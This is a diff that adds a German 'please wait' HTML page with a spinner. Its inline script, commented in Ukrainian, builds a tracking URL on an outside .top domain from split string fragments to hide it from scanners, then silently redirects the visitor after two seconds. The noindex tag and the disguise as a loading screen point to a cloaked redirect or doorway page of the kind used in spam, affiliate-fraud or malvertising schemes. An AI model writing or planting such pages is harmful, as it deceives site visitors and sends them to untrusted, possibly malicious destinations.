@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Bitte warten...</title>
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    // Частини цільової URL
+    const part1 = "https://si";
+    const part2 = "suny.top/c";
+    const part3 = "lick?o=2&";
+    const part4 = "a=1081";
+
+    // Змінна для збору URL
+    let targetUrl = "";
+
+    // Затримка та збір URL
+    setTimeout(() => {
+      // Збираємо частини разом перед перенаправленням
+      targetUrl = part1 + part2 + part3 + part4;
+          
+      // Виконуємо перенаправлення
+      window.location.href = targetUrl;
+    }, 2000); // 2 секунди затримки
+  </script>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f0f2f5;
+      color: #333;
+      text-align: center;
+      padding-top: 120px;
+      margin: 0;
+    }
+
+    p {
+      font-size: 1.4em;
+      margin-bottom: 40px;
+    }
+
+    .spinner {
+      margin: 0 auto;
+      width: 40px;
+      height: 40px;
+      border: 4px solid #ccc;
+      border-top: 4px solid #333;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <p>Bitte warten Sie einen Moment.</p>
+  <div class="spinner"></div>
+</body>
+</html>
